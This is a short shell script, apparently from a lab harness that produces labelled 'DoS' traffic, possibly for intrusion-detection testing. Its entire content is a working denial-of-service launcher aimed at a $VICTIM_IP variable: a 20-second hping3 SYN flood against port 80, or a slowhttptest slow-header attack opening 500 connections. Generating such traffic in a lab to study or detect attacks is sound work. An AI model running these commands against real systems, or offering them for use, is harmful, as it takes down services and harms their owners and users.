#!/bin/sh
# Expected class: DoS. Usage: dos.sh [syn|slow]  (default: syn, 20 s)
. "$(dirname "$0")/common.sh"
case "${1:-syn}" in
  syn)  timeout 20 hping3 -S --flood -p 80 "$VICTIM_IP" ;;
  slow) slowhttptest -c 500 -H -g -o /tmp/slow -i 10 -r 100 -t GET -u "http://$VICTIM_IP/" -x 24 -p 3 ;;
  *) echo "usage: $0 [syn|slow]" >&2; exit 1 ;;
esac
